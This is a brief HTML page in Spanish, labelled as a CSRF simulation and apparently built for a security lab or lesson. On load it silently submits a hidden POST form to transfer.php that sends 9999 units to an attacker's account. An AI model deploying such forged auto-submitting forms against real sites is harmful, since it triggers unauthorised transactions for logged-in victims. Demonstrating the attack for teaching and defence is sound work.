<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Pagina atacante</title>
</head>
<body onload="document.forms[0].submit()">
    <h1>Simulacion CSRF</h1>
    <form method="POST" action="transfer.php">
        <input type="hidden" name="amount" value="9999">
        <input type="hidden" name="to" value="cuenta_atacante">
    </form>
</body>
</html>
